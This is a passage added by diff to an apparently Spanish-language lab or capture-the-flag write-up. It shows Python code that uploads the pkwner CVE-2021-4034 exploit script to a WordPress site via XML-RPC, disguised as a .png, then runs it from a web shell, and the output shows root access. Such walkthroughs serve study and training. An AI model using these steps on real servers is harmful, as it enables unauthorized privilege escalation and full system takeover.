@@ -352,3 +352,43 @@ done
 
 https://github.com/kimusan/pkwner?tab=readme-ov-file
 
+### Para subir los archivos podemos seguir usando la libreria de python, hay una opcion para subir archivos media.
+
+### primero creamos una variable para lo cual vamos a leer el archivo con python
+```
+from wordpress_xmlrpc.methods import media
+with open('pkwner.sh','r') as f:
+    filename = f.read()
+
+```
+### Si consultamos la la variable `filename` podemos imprimir el archivo en consola
+
+### ya habiendo guarado la variable subimos el archivo con ayuda de la libreria.
+
+```
+data_to_upload = {'name':'pkwner.sh','bits':filename,'type':'text/plain'}
+client.call(media.UploadFile(data_to_upload))
+
+client.call(media.UploadFile(data_to_upload))
+{'attachment_id': '48', 'date_created_gmt': <DateTime '20240624T06:12:50' at 0x7fd2c389b110>, 'parent': 0, 'link': '/wp-content/uploads/2024/06/pkwner.png', 'title': 'pkwner.png', 'caption': '', 'description': '', 'metadata': False, 'type': 'text/plain', 'thumbnail': '/wp-content/uploads/2024/06/pkwner.png', 'id': '48', 'file': 'pkwner.png', 'url': '/wp-content/uploads/2024/06/pkwner.png'}
+
+
+```
+### Con la fakeshell consultamos el archivo de la siguiente forma. al exploit se le modifico la salida-
+
+```
+bash /var/www/html//wp-content/uploads/2024/06/pkwner.png
+██████╗ ██╗  ██╗██╗    ██╗███╗   ██╗███████╗██████╗
+██╔══██╗██║ ██╔╝██║    ██║████╗  ██║██╔════╝██╔══██╗
+██████╔╝█████╔╝ ██║ █╗ ██║██╔██╗ ██║█████╗  ██████╔╝
+██╔═══╝ ██╔═██╗ ██║███╗██║██║╚██╗██║██╔══╝  ██╔══██╗
+██║     ██║  ██╗╚███╔███╔╝██║ ╚████║███████╗██║  ██║
+╚═╝     ╚═╝  ╚═╝ ╚══╝╚══╝ ╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝
+CVE-2021-4034 PoC by Kim Schulz
+[+] Setting up environment...
+[+] Build offensive gconv shared module...
+[+] Build mini executor...
+uid=0(root) gid=0(root) groups=0(root),33(www-data)
+hello[+] Nice Job
+
+```
